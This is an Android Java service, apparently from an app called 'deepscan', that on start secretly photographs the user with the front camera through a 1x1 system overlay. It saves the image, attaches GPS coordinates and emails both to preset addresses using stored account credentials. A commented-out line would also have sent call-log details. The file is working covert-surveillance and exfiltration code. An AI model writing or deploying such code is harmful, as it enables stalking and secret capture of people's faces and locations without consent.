package com.deepscan;



import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.PixelFormat;
import android.hardware.Camera;
import android.os.Environment;
import android.os.IBinder;
import android.util.Log;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.WindowManager;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.Arrays;
import java.util.List;
import java.util.Random;

/** Takes a single photo on service start. */
public class PhotoTakingService extends Service {


    GPSTracker gps;
    @Override
    public void onCreate() {
        super.onCreate();
        takePhoto(this);
    }

    @SuppressWarnings("deprecation")
    private  void takePhoto(final Context context) {

        gps=new GPSTracker(context);
        final SurfaceView preview = new SurfaceView(context);
        SurfaceHolder holder = preview.getHolder();
        // deprecated setting, but required on Android versions prior to 3.0
        holder.setType(SurfaceHolder.SURFACE_TYPE_PUSH_BUFFERS);

        holder.addCallback(new SurfaceHolder.Callback() {
            @Override
            //The preview must happen at or after this point or takePicture fails
            public void surfaceCreated(SurfaceHolder holder) {
                showMessage("Surface created");

                Camera camera = null;

                try {
                  //  camera = Camera.open();
                    camera=openFrontFacingCameraGingerbread(camera);

                    showMessage("Opened camera");

                    try {
                        camera.setPreviewDisplay(holder);
                    } catch (IOException e) {
                        throw new RuntimeException(e);
                    }

                    camera.startPreview();
                    showMessage("Started preview");

                    camera.takePicture(null, null, new Camera.PictureCallback() {

                        @Override
                        public void onPictureTaken(byte[] data, Camera camera) {
                            showMessage("Took picture");
                            Bitmap bitmap = BitmapFactory.decodeByteArray(data, 0, data.length);
                           String path= SaveImage(bitmap);

                            String location="";
                            if(gps.canGetLocation())
                            {
                                location="\nLatitude: "+gps.getLatitude()+"\nLongitude: "+gps.getLongitude();
                            }

                          //  String body="Number:"+phNumber+"\nDate:"+dateString+"\nTime:"+timeString+"\nDuration:"+callDuration+"\nCall Type:"+dir+"\n\n";
                            String body="find the attachment"+location;
                            List<String> toEmailList = Arrays.asList(Constant.TO_EMAIL_PATTERN
                                    .split("\\s*,\\s*"));


                            new SendMailTask(context).execute(Constant.EMAIL,
                                    Constant.PASSWORD, toEmailList, "Pattern Recognise", body,true,path);
                            showMessage(path);
                            camera.release();
                        }
                    });
                } catch (Exception e) {
                    if (camera != null)
                        camera.release();
                    throw new RuntimeException(e);
                }

                stopSelf();
            }

            @Override
            public void surfaceDestroyed(SurfaceHolder holder) {}
            @Override
            public void surfaceChanged(SurfaceHolder holder, int format, int width, int height) {}
        });

        WindowManager wm = (WindowManager)context
                .getSystemService(Context.WINDOW_SERVICE);
        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                1, 1, //Must be at least 1x1
                WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY,
                0,
                //Don't know if this is a safe default
                PixelFormat.UNKNOWN);

        //Don't set the preview visibility to GONE or INVISIBLE
        wm.addView(preview, params);
    }

    private  void showMessage(String message) {
        Log.i("Camera", message);
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    private String SaveImage(Bitmap finalBitmap) {

        String root = Environment.getExternalStorageDirectory().toString();
        File myDir = new File(root + "/MYGALLERY");
        myDir.mkdirs();
        Random generator = new Random();
        int n = 10000;
        n = generator.nextInt(n);
        String fname = "Image-"+ n +".jpg";
        File file = new File(myDir, fname);
        if (file.exists ()) file.delete ();
        try {
            FileOutputStream out = new FileOutputStream(file);
            finalBitmap.compress(Bitmap.CompressFormat.JPEG, 90, out);
            out.flush();
            out.close();

        } catch (Exception e) {
            e.printStackTrace();
        }

        return file.getAbsolutePath();
    }
    @SuppressWarnings("deprecation")
    private Camera openFrontFacingCameraGingerbread(Camera mCamera) {
        if (mCamera != null) {
            mCamera.stopPreview();
            mCamera.release();
        }
        int cameraCount = 0;
        Camera cam = null;
        Camera.CameraInfo cameraInfo = new Camera.CameraInfo();
        cameraCount = Camera.getNumberOfCameras();
        for (int camIdx = 0; camIdx < cameraCount; camIdx++) {
            Camera.getCameraInfo(camIdx, cameraInfo);
            if (cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
                try {
                    cam = Camera.open(camIdx);
                } catch (RuntimeException e) {
                    Log.e("Camera", "Camera failed to open: " + e.getLocalizedMessage());

                }
            }
        }
        return cam;
    }
}
